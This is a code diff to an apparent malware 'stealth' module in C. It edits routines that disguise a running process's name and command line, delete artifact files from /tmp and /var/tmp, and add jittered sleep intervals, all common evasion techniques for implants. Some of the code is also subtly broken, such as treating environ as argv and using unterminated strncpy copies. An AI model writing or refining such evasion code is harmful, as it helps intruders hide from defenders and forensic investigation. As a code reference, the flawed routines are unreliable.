@@ -1,33 +1,37 @@
 #include "stealth.h"
-extern time_t time(time_t *t); // Trying to fix time.h by explicit declaration
-// #include <time.h> // to fix ISO C99 and later do not support implicit function declarations
+#include <time.h>
+#include <unistd.h> // For sleep or usleep
 
+extern char **environ;
 void rename_process(const char *new_name) {
-    // Change the process name to the new_name
 #ifdef __linux__
+    extern char *program_invocation_short_name;
+    extern char *program_invocation_name;
     strncpy(program_invocation_short_name, new_name, strlen(new_name));
     strncpy(program_invocation_name, new_name, strlen(new_name));
-#endif
-#ifdef __APPLE__
-    // macOS equivalent
+#elif __APPLE__
+    // macOS equivalent using setproctitle
     extern int setproctitle(const char *);
     setproctitle(new_name);
+#else
+    printf("Rename process not supported on this platform.\n");
 #endif
     printf("Process renamed to: %s\n", new_name);
 }
 
 void change_cmdline(const char *new_cmdline) {
-    // Change the command-line arguments displayed in `/proc/<pid>/cmdline`
 #ifdef __linux__
-    char **argv = *(char ***) environ;
+    extern char **environ;
+    char **argv = *(char ***)environ;
     strncpy(argv[0], new_cmdline, strlen(new_cmdline));
     argv[1] = NULL; // Terminate the argument list
+#else
+    printf("Change cmdline not supported on this platform.\n");
 #endif
     printf("Command-line arguments updated.\n");
 }
 
 void clean_artifacts() {
-    // Remove temporary files or artifacts
     const char *temp_files[] = {"/tmp/file1", "/var/tmp/file2", NULL};
     for (int i = 0; temp_files[i] != NULL; i++) {
         if (unlink(temp_files[i]) == 0) {
@@ -39,7 +43,6 @@ void clean_artifacts() {
 }
 
 void dynamic_sleep(int base_time, int jitter) {
-    // Sleep for a random interval based on base_time and jitter
     srand(time(NULL));
     int sleep_time = base_time + (rand() % jitter);
     printf("Sleeping for %d seconds...\n", sleep_time);
